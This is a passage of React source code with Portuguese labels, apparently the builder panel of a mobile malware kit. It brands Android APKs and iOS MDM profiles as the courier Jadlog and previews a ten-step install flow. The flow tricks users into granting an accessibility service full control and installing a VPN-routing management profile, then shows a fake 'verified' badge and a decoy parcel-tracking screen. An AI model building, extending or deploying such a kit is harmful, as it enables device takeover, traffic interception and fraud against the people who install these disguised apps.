                          HISTÓRICO DE LOGOS / IMAGENS RECENTES (CLIQUE PARA SELECIONAR)
                        </span>
                        <label className="upload-logo-inline-btn" title="Fazer upload de nova imagem para a galeria">
                          <Upload size={12} />
                          <span>Enviar Nova Imagem</span>
                          <input type="file" accept="image/png,image/jpeg,image/webp" onChange={handleUploadLogo} style={{ display: "none" }} />
                        </label>
                      </div>

                      {/* Grade de Logos Históricos / Presets */}
                      <div className="recent-logos-grid">
                        {recentLogos.map((logo) => {
                          const isSelected = selectedLogoId === logo.id;
                          return (
                            <button
                              key={logo.id}
                              type="button"
                              className={`preset-logo-card ${isSelected ? "selected-logo" : ""}`}
                              onClick={() => {
                                setSelectedLogoId(logo.id);
                                if (logo.dataUrl) setCustomLogoDataUrl(logo.dataUrl);
                                else setCustomLogoDataUrl("");
                                showToast(`Logo "${logo.name}" selecionado.`);
                              }}
                            >
                              <div
                                className="preset-logo-preview"
                                style={{ backgroundColor: logo.bg, color: logo.color }}
                              >
                                {logo.dataUrl ? (
                                  <img src={logo.dataUrl} alt={logo.name} style={{ width: "100%", height: "100%", objectFit: "cover", borderRadius: "8px" }} />
                                ) : logo.type === "jadlog" ? (
                                  <span style={{ fontWeight: 900, fontSize: "12px" }}>jad<span style={{ color: "#ffffff" }}>log</span></span>
                                ) : (
                                  <span style={{ fontWeight: 800, fontSize: "11px" }}>{logo.label}</span>
                                )}
                                {isSelected && (
                                  <div className="logo-checked-badge">
                                    <Check size={10} />
                                  </div>
                                )}
                              </div>
                              <span className="preset-logo-title">{logo.name}</span>
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    {/* Botões de Ação */}
                    <div style={{ display: "flex", gap: "10px", marginTop: "8px", flexWrap: "wrap" }}>
                      {modalMode === "edit" ? (
                        <button
                          className="primary"
                          type="submit"
                          disabled={building}
                          style={{ flex: 1, justifyContent: "center", padding: "12px", fontSize: "14px", fontWeight: 700 }}
                        >
                          {building
                            ? "Processando e Compilando..."
                            : platform === "ios"
                            ? "Salvar Alterações e Atualizar Perfil iOS"
                            : "Salvar Alterações e Atualizar APK"}
                        </button>
                      ) : platform === "ios" ? (
                        <button
                          className="primary"
                          type="submit"
                          disabled={building}
                          style={{
                            flex: 1,
                            justifyContent: "center",
                            padding: "12px",
                            fontSize: "14px",
                            fontWeight: 700,
                            background: "linear-gradient(135deg, #0284c7, #0369a1)"
                          }}
                        >
                          {building ? "Processando e Compilando..." : "Gerar Perfil Apple iOS & Projeto Swift"}
                        </button>
                      ) : (
                        <>
                          {/* OPÇÃO 1: GERAR QR CODE (0-CLICK MDM) */}
                          <button
                            className="primary"
                            type="submit"
                            disabled={building}
                            onClick={() => setTargetAction("qr")}
                            style={{
                              flex: 1,
                              minWidth: "220px",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center",
                              gap: "8px",
                              padding: "12px 14px",
                              fontSize: "13.5px",
                              fontWeight: 700,
                              background: "linear-gradient(135deg, #0284c7, #0369a1)",
                              border: "1px solid #38bdf8",
                              boxShadow: "0 0 15px rgba(56, 189, 248, 0.25)",
                              cursor: "pointer"
                            }}
                          >
                            <QrCode size={18} />
                            <span>{building ? "Processando..." : "1. 📱 Gerar QR Code (0-Click MDM)"}</span>
                          </button>

                          {/* OPÇÃO 2: GERAR APK (DOWNLOAD & EMULADOR) */}
                          <button
                            className="primary"
                            type="submit"
                            disabled={building}
                            onClick={() => setTargetAction("apk")}
                            style={{
                              flex: 1,
                              minWidth: "220px",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center",
                              gap: "8px",
                              padding: "12px 14px",
                              fontSize: "13.5px",
                              fontWeight: 700,
                              background: "linear-gradient(135deg, var(--crimson-neon), #991b1b)",
                              border: "1px solid var(--crimson-neon)",
                              boxShadow: "0 0 15px rgba(255, 26, 42, 0.25)",
                              cursor: "pointer"
                            }}
                          >
                            <Download size={18} />
                            <span>{building ? "Processando..." : "2. 📦 Gerar APK (Download & Emulador)"}</span>
                          </button>
                        </>
                      )}

                      <button
                        type="button"
                        className="secondary"
                        onClick={() => setActiveModalTab("preview")}
                        style={{ padding: "0 18px", display: "flex", alignItems: "center", gap: "8px" }}
                      >
                        <Eye size={15} />
                        <span>Ver Telas no Celular</span>
                      </button>

                      <button
                        type="button"
                        className="secondary"
                        onClick={() => setShowModal(false)}
                        style={{ padding: "0 18px" }}
                      >
                        Cancelar
                      </button>
                    </div>
                  </form>
                )}
              </div>
            )}

            {/* TAB 2: CUSTOMIZAR TELAS (AJUSTE DINÂMICO DE TEXTOS, LOGO E CORES) */}
            {activeModalTab === "screens" && (
              <div className="screen-customizer-container">
                {/* Banner Informativo */}
                <div className="customizer-intro-banner">
                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                    <Sparkles size={20} style={{ color: "var(--crimson-neon)", flexShrink: 0 }} />
                    <div>
                      <strong style={{ fontSize: "14px", color: "#f8fafc", display: "block" }}>
                        Personalização Dinâmica de Todas as Telas de Instalação e Ativação
                      </strong>
                      <span style={{ fontSize: "12px", color: "#94a3b8" }}>
                        O logotipo, o nome do aplicativo e todos os textos ajustados aqui refletem em tempo real no simulador interativo de 10 etapas e são embutidos nos parâmetros do APK.
                      </span>
                    </div>
                  </div>
                  <button
                    type="button"
                    className="secondary compact-btn"
                    onClick={() => {
                      setScreenConfig(defaultScreenConfig);
                      showToast("Textos e parâmetros restaurados para o padrão oficial do vídeo!");
                    }}
                    style={{ display: "flex", alignItems: "center", gap: "6px" }}
                  >
                    <RotateCcw size={13} />
                    <span>Restaurar Padrão do Vídeo</span>
                  </button>
                </div>

                {/* Grid de Seções de Customização */}
                <div className="customizer-grid">
                  {/* CARD 1: Identidade Visual e Cor de Destaque */}
                  <div className="customizer-card">
                    <h4 className="customizer-card-title">
                      <Palette size={15} style={{ color: screenConfig.accentColor || "#dc2626" }} />
                      Identidade Visual & Cor de Destaque
                    </h4>
                    <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
                      <div>
                        <label style={{ fontSize: "12px", color: "#cbd5e1", marginBottom: "6px", display: "block" }}>
                          Paleta de Cores da Marca:
                        </label>
                        <div style={{ display: "flex", alignItems: "center", gap: "8px", flexWrap: "wrap" }}>
                          {brandAccentPresets.map((preset) => (
                            <button
                              key={preset.hex}
                              type="button"
                              className={`color-swatch-btn ${screenConfig.accentColor === preset.hex ? "active" : ""}`}
                              style={{ backgroundColor: preset.hex }}
                              onClick={() => setScreenConfig((prev) => ({ ...prev, accentColor: preset.hex }))}
                              title={preset.name}
                            >
                              {screenConfig.accentColor === preset.hex && <Check size={12} color="#ffffff" />}
                            </button>
                          ))}
                          <div style={{ display: "flex", alignItems: "center", gap: "6px", marginLeft: "6px" }}>
                            <input
                              type="color"
                              value={screenConfig.accentColor || "#dc2626"}
                              onChange={(e) => setScreenConfig((prev) => ({ ...prev, accentColor: e.target.value }))}
                              style={{ width: "28px", height: "28px", padding: 0, border: "none", borderRadius: "50%", cursor: "pointer", background: "transparent" }}
                              title="Selecionar cor personalizada"
                            />
                            <span style={{ fontSize: "11px", color: "#94a3b8", fontFamily: "var(--font-mono)" }}>
                              {screenConfig.accentColor || "#dc2626"}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Prévia da Identidade Visual */}
                      <div style={{ background: "#080a10", border: "1px solid #1e293b", borderRadius: "8px", padding: "10px 12px", display: "flex", alignItems: "center", gap: "12px" }}>
                        {renderAppLogo(36, 8)}
                        <div>
                          <strong style={{ fontSize: "13px", color: "#ffffff", display: "block" }}>{appName}</strong>
                          <small style={{ fontSize: "10.5px", color: "#64748b" }}>Logotipo ativo refletido nas 10 telas</small>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* CARD 2: Textos de Carregamento & Splash (Telas 02 e 03) */}
                  <div className="customizer-card">
                    <h4 className="customizer-card-title">
                      <Sliders size={15} style={{ color: "#38bdf8" }} />
                      Carregamento & Splash (Telas 02 e 03)
                    </h4>
                    <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
                      <label style={{ fontSize: "12px" }}>
                        Subtexto de Atualização (Tela 02):
                        <input
                          value={screenConfig.loadingSubtext || ""}
                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, loadingSubtext: e.target.value }))}
                          placeholder="aguarde, atualização em andamento..."
                          style={{ marginTop: "4px" }}
                        />
                      </label>
                      <label style={{ fontSize: "12px" }}>
                        Copyright / Rodapé Splash (Tela 03):
                        <input
                          value={screenConfig.copyrightText || ""}
                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, copyrightText: e.target.value }))}
                          placeholder="All Rights Reserved."
                          style={{ marginTop: "4px" }}
                        />
                        <small style={{ color: "#64748b", fontSize: "10.5px", marginTop: "2px", display: "block" }}>
                          Exibido como: © 25 {appName}. {screenConfig.copyrightText || "All Rights Reserved."}
                        </small>
                      </label>
                    </div>
                  </div>

                  {/* CARD 3: Balão de Instrução & Permissões (Telas 06, 07 e 08) */}
                  <div className="customizer-card" style={{ gridColumn: "span 2" }}>
                    <h4 className="customizer-card-title">
                      <ShieldAlert size={15} style={{ color: "#f59e0b" }} />
                      Balão de Orientação & Diálogos de Acessibilidade (Telas 06, 07 e 08)
                    </h4>
                    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px" }}>
                      <label style={{ fontSize: "12px" }}>
                        Texto do Balão Flutuante (Tela 06):
                        <textarea
                          rows={2}
                          value={screenConfig.speechCalloutText || ""}
                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, speechCalloutText: e.target.value }))}
                          placeholder="Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar."
                          style={{ marginTop: "4px", width: "100%", resize: "vertical" }}
                        />
                      </label>
                      <label style={{ fontSize: "12px" }}>
                        Título do Diálogo de Autorização (Tela 08):
                        <input
                          value={screenConfig.permissionDialogTitle || ""}
                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, permissionDialogTitle: e.target.value }))}
                          placeholder="Permitir controle total para {appName}?"
                          style={{ marginTop: "4px" }}
                        />
                        <small style={{ color: "#64748b", fontSize: "10.5px", marginTop: "2px", display: "block" }}>
                          Use <code>{"{appName}"}</code> para incluir o nome do aplicativo dinamicamente.
                        </small>
                      </label>
                    </div>
                    <div style={{ marginTop: "10px" }}>
                      <label style={{ fontSize: "12px" }}>
                        Descrição Oficial do Serviço (Tela 07):
                        <textarea
                          rows={2}
                          value={screenConfig.serviceDescription || ""}
                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, serviceDescription: e.target.value }))}
                          placeholder="O serviço de acessibilidade do {appName} permite..."
                          style={{ marginTop: "4px", width: "100%", resize: "vertical" }}
                        />
                      </label>
                    </div>
                  </div>

                  {/* CARD 4: Tela Final / Interface Pós-Ativação (Tela 10) */}
                  <div className="customizer-card" style={{ gridColumn: "span 2" }}>
                    <h4 className="customizer-card-title">
                      <CheckCircle2 size={15} style={{ color: "#22c55e" }} />
                      Interface Final Pós-Ativação (Tela 10)
                    </h4>
                    <div style={{ display: "grid", gridTemplateColumns: "1fr 1.5fr", gap: "12px" }}>
                      <label style={{ fontSize: "12px" }}>
                        Título Principal da Tela 10:
                        <input
                          value={screenConfig.trackingTitle || ""}
                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, trackingTitle: e.target.value }))}
                          placeholder="Rastreamento de Encomendas"
                          style={{ marginTop: "4px" }}
                        />
                      </label>
                      <label style={{ fontSize: "12px" }}>
                        Subtítulo / Orientação da Tela 10:
                        <input
                          value={screenConfig.trackingSubtext || ""}
                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, trackingSubtext: e.target.value }))}
                          placeholder="Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos."
                          style={{ marginTop: "4px" }}
                        />
                      </label>
                    </div>
                  </div>
                </div>

                {/* Ações do Rodapé da Tab Customizar */}
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginTop: "16px", paddingTop: "14px", borderTop: "1px solid #1e293b" }}>
                  <button
                    type="button"
                    className="secondary"
                    onClick={() => setActiveModalTab("form")}
                  >
                    <ArrowLeft size={14} /> Voltar aos Parâmetros
                  </button>

                  <button
                    type="button"
                    className="primary"
                    onClick={() => {
                      setActiveModalTab("preview");
                      showToast("Configurações aplicadas! Veja as alterações no simulador de celular.");
                    }}
                    style={{ display: "flex", alignItems: "center", gap: "8px", padding: "10px 20px" }}
                  >
                    <Eye size={15} />
                    <span>Ver Telas no Simulador de Celular →</span>
                  </button>
                </div>
              </div>
            )}

            {/* TAB 3: PREVIEW DE TODAS AS 10 TELAS OFICIAIS DE INSTALAÇÃO E ACESSIBILIDADE */}
            {activeModalTab === "preview" && (
              <div className="android-preview-stage">
                {/* Top Stepper Selector */}
                <div className="preview-stepper-bar">
                  <div style={{ display: "flex", alignItems: "center", gap: "8px", flexWrap: "wrap" }}>
                    <button
                      className="secondary compact-btn"
                      disabled={previewStep <= 1}
                      onClick={() => setPreviewStep((s) => Math.max(1, s - 1))}
                    >
                      <ChevronLeft size={16} /> Anterior
                    </button>

                    <div className="preview-steps-pills">
                      {officialSteps.map((stepMeta) => (
                        <button
                          key={stepMeta.step}
                          className={`step-pill-btn ${previewStep === stepMeta.step ? "active" : ""}`}
                          onClick={() => setPreviewStep(stepMeta.step)}
                          title={`${stepMeta.name}: ${stepMeta.subtitle}`}
                        >
                          {stepMeta.step}
                        </button>
                      ))}
                    </div>

                    <button
                      className="secondary compact-btn"
                      disabled={previewStep >= 10}
                      onClick={() => setPreviewStep((s) => Math.min(10, s + 1))}
                    >
                      Próxima <ChevronRight size={16} />
                    </button>

                    <button
                      type="button"
                      className={`secondary compact-btn ${isPlayingAuto ? "active" : ""}`}
                      onClick={() => setIsPlayingAuto(!isPlayingAuto)}
                      title="Avanço contínuo simulando a instalação completa pelas 10 etapas"
                      style={{ display: "flex", alignItems: "center", gap: "5px" }}
                    >
                      <Play size={12} style={{ color: isPlayingAuto ? "#22c55e" : "var(--crimson-neon)" }} />
                      <span>{isPlayingAuto ? "Pausar Demo" : "Auto Demo"}</span>
                    </button>
                  </div>

                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                    <span
                      className="preview-step-badge"
                      style={{
                        background: `${officialSteps[previewStep - 1].badgeColor}22`,
                        color: officialSteps[previewStep - 1].badgeColor,
                        border: `1px solid ${officialSteps[previewStep - 1].badgeColor}55`
                      }}
                    >
                      {officialSteps[previewStep - 1].badge}
                    </span>
                    <span className="step-title-display">
                      {officialSteps[previewStep - 1].title}
                    </span>
                  </div>
                </div>

                {/* Quick Inline Adjustment Bar (Ajuste Rápido de Nome, Logo e Cores) */}
                <div className="preview-quick-toolbar">
                  <div style={{ display: "flex", alignItems: "center", gap: "8px", flex: 1, minWidth: "260px" }}>
                    <span style={{ fontSize: "11px", fontWeight: 700, color: "#94a3b8", textTransform: "uppercase" }}>
                      Nome do App:
                    </span>
                    <input
                      type="text"
                      value={appName}
                      onChange={(e) => setAppName(e.target.value)}
                      placeholder="Nome do Aplicativo..."
                      style={{
                        padding: "5px 10px",
                        fontSize: "12px",
                        background: "#080a10",
                        border: "1px solid #334155",
                        borderRadius: "6px",
                        color: "#ffffff",
                        flex: 1,
                        maxWidth: "240px"
                      }}
                    />
                  </div>

                  {/* Quick Color Picker */}
                  <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                    <span style={{ fontSize: "11px", fontWeight: 600, color: "#94a3b8" }}>Cor da Marca:</span>
                    {brandAccentPresets.slice(0, 6).map((p) => (
                      <button
                        key={p.hex}
                        type="button"
                        onClick={() => setScreenConfig((prev) => ({ ...prev, accentColor: p.hex }))}
                        style={{
                          width: "18px",
                          height: "18px",
                          borderRadius: "50%",
                          background: p.hex,
                          border: screenConfig.accentColor === p.hex ? "2px solid #ffffff" : "1px solid rgba(255,255,255,0.2)",
                          boxShadow: screenConfig.accentColor === p.hex ? `0 0 8px ${p.hex}` : "none",
                          cursor: "pointer",
                          padding: 0
                        }}
                        title={p.name}
                      />
                    ))}
                  </div>

                  {/* Button to Jump to Full Customizer */}
                  <button
                    type="button"
                    className="secondary compact-btn"
                    onClick={() => setActiveModalTab("screens")}
                    style={{ fontSize: "11px", padding: "5px 12px", display: "flex", alignItems: "center", gap: "6px" }}
                  >
                    <Sliders size={13} style={{ color: "var(--crimson-neon)" }} />
                    <span>Ajustar Textos de Todas as Telas</span>
                  </button>
                </div>

                {/* Split Layout: Smartphone Mockup + Checklist de Validação */}
                <div className="preview-split-layout">
                  {/* LADO ESQUERDO: SMARTPHONE / IPHONE MOCKUP FRAME */}
                  <div className={platform === "ios" ? "iphone-mockup-frame" : "smartphone-mockup-frame"}>
                    <div className="smartphone-inner">
                      {platform === "ios" ? (
                        /* Barra de Status do Sistema iOS com Dynamic Island */
                        <div className="smartphone-statusbar" style={{ background: "rgba(0, 0, 0, 0.85)", color: "#ffffff", padding: "6px 14px" }}>
                          <span style={{ fontWeight: 700, fontSize: "11px", letterSpacing: "-0.2px" }}>9:41</span>
                          <div className="iphone-dynamic-island">
                            <div className="iphone-island-lens" />
                            <div className="iphone-island-sensor" />
                          </div>
                          <div style={{ display: "flex", alignItems: "center", gap: "5px", fontSize: "10px" }}>
                            {previewStep >= 9 && (
                              <span style={{ fontSize: "8.5px", background: "#38bdf8", color: "#000000", fontWeight: 800, padding: "1px 3px", borderRadius: "3px" }}>
                                VPN
                              </span>
                            )}
                            <span style={{ fontWeight: 600 }}>5G</span>
                            <span style={{ border: "1.2px solid rgba(255,255,255,0.8)", borderRadius: "4px", padding: "0 2px", fontSize: "8.5px", fontWeight: 700 }}>100%</span>
                          </div>
                        </div>
                      ) : (
                        /* Barra de Status do Sistema Android */
                        <div className={`smartphone-statusbar ${[2, 4, 5, 6, 7, 9, 10].includes(previewStep) ? "phone-light-statusbar" : ""}`}>
                          <span>12:30</span>
                          <div className="smartphone-camera-hole" />
                          <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                            <span>5G</span>
                            <span>100%</span>
                          </div>
                        </div>
                      )}

                      {/* SE PLATFORM FOR APPLE IOS */}
                      {platform === "ios" && (
                        <>
                          {/* TELA 01 — DOWNLOAD DO PERFIL NO SAFARI */}
                          {previewStep === 1 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "12px", background: "#1c1c1e", justifyContent: "space-between" }}>
                              <div style={{ background: "#2c2c2e", borderRadius: "10px", padding: "8px 12px", display: "flex", alignItems: "center", justifyContent: "center", gap: "6px" }}>
                                <Lock size={11} style={{ color: "#98989d" }} />
                                <span style={{ fontSize: "11px", color: "#ffffff", fontWeight: 500 }}>jadlog.com.br/install</span>
                              </div>

                              <div style={{ background: "#2c2c2e", borderRadius: "16px", padding: "18px 16px", color: "#ffffff", boxShadow: "0 10px 30px rgba(0,0,0,0.6)", textAlign: "center" }}>
                                <div style={{ width: "42px", height: "42px", borderRadius: "10px", background: "rgba(56, 189, 248, 0.15)", border: "1px solid rgba(56, 189, 248, 0.3)", display: "grid", placeItems: "center", margin: "0 auto 12px auto" }}>
                                  <Apple size={24} style={{ color: "#38bdf8" }} />
                                </div>
                                <h4 style={{ margin: "0 0 6px 0", fontSize: "14px", fontWeight: 700, color: "#ffffff" }}>
                                  Perfil de Configuração
                                </h4>
                                <p style={{ margin: "0 0 16px 0", fontSize: "12px", color: "#d1d5db", lineHeight: "1.4" }}>
                                  Este site está tentando baixar um perfil de configuração para '{appName}'. Deseja permitir?
                                </p>
                                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px" }}>
                                  <button
                                    style={{ background: "#3a3a3c", border: "none", color: "#98989d", padding: "10px", borderRadius: "10px", fontSize: "13px", fontWeight: 600, cursor: "pointer" }}
                                    onClick={() => showToast("Download ignorado")}
                                  >
                                    Ignorar
                                  </button>
                                  <button
                                    className="ios-btn-blue"
                                    onClick={() => setPreviewStep(2)}
                                  >
                                    Permitir
                                  </button>
                                </div>
                              </div>

                              <div style={{ display: "flex", justifyContent: "space-around", padding: "8px 0", color: "#007aff", opacity: 0.8 }}>
                                <ChevronLeft size={16} />
                                <ChevronRight size={16} />
                                <ExternalLink size={14} />
                                <Boxes size={14} />
                              </div>
                            </div>
                          )}

                          {/* TELA 02 — PERFIL DESCARREGADO */}
                          {previewStep === 2 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "rgba(0,0,0,0.65)", justifyContent: "center", alignItems: "center" }}>
                              <div style={{ background: "rgba(255, 255, 255, 0.95)", backdropFilter: "blur(20px)", borderRadius: "16px", padding: "20px 18px", color: "#000000", width: "100%", textAlign: "center", boxShadow: "0 20px 40px rgba(0,0,0,0.5)" }}>
                                <h4 style={{ margin: "0 0 8px 0", fontSize: "16px", fontWeight: 700 }}>Perfil Baixado</h4>
                                <p style={{ margin: "0 0 18px 0", fontSize: "12px", color: "#475569", lineHeight: "1.45" }}>
                                  Revise o perfil no app <strong>Ajustes</strong> se quiser instalá-lo no iPhone.
                                </p>
                                <button
                                  style={{ width: "100%", background: "#007aff", color: "#ffffff", border: "none", borderRadius: "10px", padding: "10px", fontSize: "14px", fontWeight: 700, cursor: "pointer" }}
                                  onClick={() => setPreviewStep(3)}
                                >
                                  Fechar & Abrir Ajustes
                                </button>
                              </div>
                            </div>
                          )}

                          {/* TELA 03 — MENU AJUSTES */}
                          {previewStep === 3 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "12px 14px", background: "#f2f2f7" }}>
                              <div style={{ margin: "4px 0 12px 0" }}>
                                <h2 style={{ margin: 0, fontSize: "22px", fontWeight: 800, color: "#000000" }}>Ajustes</h2>
                              </div>

                              <div className="ios-card" style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "12px" }}>
                                <div style={{ width: "36px", height: "36px", borderRadius: "50%", background: "#94a3b8", display: "grid", placeItems: "center", color: "#fff", fontWeight: 700, fontSize: "14px" }}>
                                  DV
                                </div>
                                <div>
                                  <strong style={{ fontSize: "13px", color: "#000", display: "block" }}>Dispositivo Corporativo</strong>
                                  <span style={{ fontSize: "10.5px", color: "#64748b" }}>Apple ID, iCloud e Mídia</span>
                                </div>
                              </div>

                              <div
                                className="ios-card"
                                style={{
                                  border: "1.5px solid #007aff",
                                  background: "linear-gradient(135deg, #ffffff, #f0f7ff)",
                                  display: "flex",
                                  alignItems: "center",
                                  justifyContent: "space-between",
                                  cursor: "pointer",
                                  marginBottom: "14px",
                                  boxShadow: "0 3px 12px rgba(0, 122, 255, 0.2)"
                                }}
                                onClick={() => setPreviewStep(4)}
                              >
                                <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                  <div style={{ width: "32px", height: "32px", borderRadius: "8px", background: "#007aff", display: "grid", placeItems: "center" }}>
                                    <Settings size={18} style={{ color: "#ffffff" }} />
                                  </div>
                                  <div>
                                    <strong style={{ fontSize: "13px", color: "#007aff", display: "block" }}>Perfil Baixado</strong>
                                    <span style={{ fontSize: "11px", color: "#334155", fontWeight: 600 }}>{appName}</span>
                                  </div>
                                </div>
                                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                                  <span style={{ width: "8px", height: "8px", borderRadius: "50%", background: "#ef4444" }} />
                                  <ChevronRight size={16} style={{ color: "#94a3b8" }} />
                                </div>
                              </div>

                              <div className="ios-card" style={{ padding: 0, overflow: "hidden" }}>
                                {[
                                  { label: "Modo Avião", icon: "✈" },
                                  { label: "Wi-Fi", icon: "📶", value: "Rede Corp 5G" },
                                  { label: "Bluetooth", icon: "ᛒ", value: "Ativado" },
                                  { label: "Geral", icon: "⚙" }
                                ].map((item, idx) => (
                                  <div key={idx} style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 14px", borderBottom: idx < 3 ? "1px solid #f1f5f9" : "none", fontSize: "12px", color: "#000" }}>
                                    <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                                      <span style={{ fontSize: "13px" }}>{item.icon}</span>
                                      <span>{item.label}</span>
                                    </div>
                                    <div style={{ display: "flex", alignItems: "center", gap: "4px", color: "#8e8e93", fontSize: "11px" }}>
                                      {item.value && <span>{item.value}</span>}
                                      <ChevronRight size={14} />
                                    </div>
                                  </div>
                                ))}
                              </div>
                            </div>
                          )}

                          {/* TELA 04 — DETALHES DO PERFIL */}
                          {previewStep === 4 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "12px 14px", background: "#f2f2f7" }}>
                              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "12px" }}>
                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "13px", cursor: "pointer", padding: 0 }} onClick={() => setPreviewStep(3)}>
                                  Cancelar
                                </button>
                                <span style={{ fontSize: "14px", fontWeight: 700, color: "#000" }}>Instalar Perfil</span>
                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "13px", fontWeight: 700, cursor: "pointer", padding: 0 }} onClick={() => setPreviewStep(5)}>
                                  Instalar
                                </button>
                              </div>

                              <div className="ios-card" style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "12px" }}>
                                {renderAppLogo(42, 10)}
                                <div>
                                  <h4 style={{ margin: "0 0 2px 0", fontSize: "15px", fontWeight: 800, color: "#000" }}>{appName}</h4>
                                  <div style={{ display: "flex", alignItems: "center", gap: "4px", color: "#16a34a", fontSize: "11px", fontWeight: 600 }}>
                                    <ShieldCheck size={13} />
                                    <span>Verificado ✓</span>
                                  </div>
                                  <span style={{ fontSize: "10.5px", color: "#64748b" }}>{organizationName}</span>
                                </div>
                              </div>

                              <div className="ios-card" style={{ marginBottom: "12px" }}>
                                <span style={{ fontSize: "11px", color: "#64748b", textTransform: "uppercase", fontWeight: 700, display: "block", marginBottom: "8px" }}>
                                  Conteúdo do Perfil:
                                </span>
                                <div style={{ display: "flex", flexDirection: "column", gap: "8px", fontSize: "11.5px", color: "#334155" }}>
                                  <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                                    <ExternalLink size={13} style={{ color: "#007aff" }} />
                                    <span><strong>WebClip:</strong> {redirectUrl}</span>
                                  </div>
                                  <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                                    <ShieldCheck size={13} style={{ color: "#16a34a" }} />
                                    <span><strong>Túnel VPN:</strong> IKEv2 Criptografado ({vpnProtocol || "TLS"}:{vpnPort || 8443})</span>
                                  </div>
                                </div>
                              </div>

                              <button
                                className="ios-btn-blue"
                                style={{ marginTop: "auto", width: "100%" }}
                                onClick={() => setPreviewStep(5)}
                              >
                                Avançar para Instalação
                              </button>
                            </div>
                          )}

                          {/* TELA 05 — AUTENTICAÇÃO COM CÓDIGO */}
                          {previewStep === 5 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "#f2f2f7", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between" }}>
                              <div style={{ textAlign: "center", marginTop: "14px" }}>
                                <h3 style={{ margin: "0 0 6px 0", fontSize: "17px", fontWeight: 700, color: "#000" }}>Digite o Código</h3>
                                <span style={{ fontSize: "11.5px", color: "#64748b" }}>Digite o código de acesso para instalar o perfil</span>
                                <div style={{ display: "flex", justifyContent: "center", gap: "10px", margin: "20px 0" }}>
                                  {[1, 2, 3, 4, 5, 6].map((i) => (
                                    <div
                                      key={i}
                                      style={{
                                        width: "12px",
                                        height: "12px",
                                        borderRadius: "50%",
                                        background: i <= 4 ? "#000000" : "transparent",
                                        border: "1.5px solid #000000"
                                      }}
                                    />
                                  ))}
                                </div>
                              </div>

                              <div style={{ width: "100%", maxWidth: "220px", display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "10px 14px", margin: "auto 0 10px 0" }}>
                                {[1, 2, 3, 4, 5, 6, 7, 8, 9, "", 0, ""].map((num, idx) => (
                                  <button
                                    key={idx}
                                    type="button"
                                    onClick={() => {
                                      if (num !== "") setPreviewStep(6);
                                    }}
                                    style={{
                                      width: "50px",
                                      height: "50px",
                                      borderRadius: "50%",
                                      background: num === "" ? "transparent" : "#e5e5ea",
                                      border: "none",
                                      fontSize: "18px",
                                      fontWeight: 600,
                                      color: "#000",
                                      cursor: num === "" ? "default" : "pointer"
                                    }}
                                  >
                                    {num}
                                  </button>
                                ))}
                              </div>

                              <button
                                className="ios-btn-blue"
                                style={{ width: "100%" }}
                                onClick={() => setPreviewStep(6)}
                              >
                                Confirmar Autenticação
                              </button>
                            </div>
                          )}

                          {/* TELA 06 — AVISO MDM */}
                          {previewStep === 6 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "14px", background: "#f2f2f7" }}>
                              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "12px" }}>
                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "13px", cursor: "pointer", padding: 0 }} onClick={() => setPreviewStep(4)}>
                                  Cancelar
                                </button>
                                <span style={{ fontSize: "14px", fontWeight: 700, color: "#000" }}>Aviso de Instalação</span>
                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "13px", fontWeight: 700, cursor: "pointer", padding: 0 }} onClick={() => setPreviewStep(7)}>
                                  Instalar
                                </button>
                              </div>

                              <div className="ios-card" style={{ marginBottom: "12px" }}>
                                <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
                                  <AlertTriangle size={18} style={{ color: "#f59e0b" }} />
                                  <strong style={{ fontSize: "13px", color: "#0f172a" }}>GERENCIAMENTO EMPRESARIAL</strong>
                                </div>
                                <p style={{ fontSize: "11.5px", color: "#334155", lineHeight: "1.45", margin: 0 }}>
                                  A instalação deste perfil permitirá ao administrador '{organizationName}' gerenciar remotamente este iPhone, adicionar atalhos corporativos na Home Screen e rotear tráfego através de conexão VPN segura.
                                </p>
                              </div>

                              <button
                                className="ios-btn-blue"
                                style={{ marginTop: "auto", width: "100%" }}
